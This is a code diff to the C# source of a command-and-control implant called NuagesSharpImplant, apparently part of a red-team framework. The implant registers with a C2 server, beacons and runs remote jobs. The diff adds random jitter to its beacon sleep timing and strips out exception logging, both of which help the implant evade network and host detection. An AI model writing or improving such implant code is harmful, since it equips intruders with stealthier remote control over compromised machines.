@@ -13,7 +13,7 @@ using System.Json;
 namespace NuagesSharpImplant
 {
     
-    public class NuagesC2Implant
+     class NuagesC2Implant
     {
         private Dictionary<string, string> config;
         private string hostname;
@@ -27,6 +27,7 @@ namespace NuagesSharpImplant
         private Dictionary<string, Assembly> assemblies;
         String[] supportedPayloads;
         JsonArray jobs;
+        private Random rnd;
 
         public string GetLocalIPv4()
         {
@@ -110,6 +111,8 @@ namespace NuagesSharpImplant
 
             this.supportedPayloads[9] = "tcp_fwd";
 
+            this.rnd = new Random();
+
             this.handler = connector.getHandler();
         }
 
@@ -119,16 +122,19 @@ namespace NuagesSharpImplant
             {
                 try {
                     this.config["id"] = connector.RegisterImplant(type: this.type, hostname: this.hostname, username: this.username, localIp: this.localIp, os: this.os, handler: this.handler, connectionString: this.connectionString, config: this.config, supportedPayloads: this.supportedPayloads);
-                    System.Threading.Thread.Sleep(1000 * Int32.Parse(this.config["sleep"]));
+                    int sleep = 1000 * Int32.Parse(this.config["sleep"]);
+                    int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
+                    System.Threading.Thread.Sleep(jitter);
                 }
                 catch (Exception e){
                     Console.WriteLine(e);
-                    System.Threading.Thread.Sleep(5000);
+                    int jitter = rnd.Next((int)(5000*0.7), (int)(5000 * 1.3));
+                    System.Threading.Thread.Sleep(jitter);
                 }
             }
             return;
         }
-
+        
         public void Heartbeat() {
             this.jobs = this.connector.Heartbeat(this.config["id"]);
         }
@@ -631,7 +637,8 @@ namespace NuagesSharpImplant
                     catch {
                         sleep = 5000;
                     }
-                    System.Threading.Thread.Sleep(sleep);
+                    int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
+                    System.Threading.Thread.Sleep(jitter);
                     this.Heartbeat();
                     foreach (JsonValue job in this.jobs)
                     {
@@ -641,7 +648,6 @@ namespace NuagesSharpImplant
                 }
                 catch (WebException ex)
                 {
-                    Console.WriteLine(ex);
                     if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                     {
                         var resp = (HttpWebResponse)ex.Response;
@@ -654,7 +660,6 @@ namespace NuagesSharpImplant
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e);
                 }
             }
 
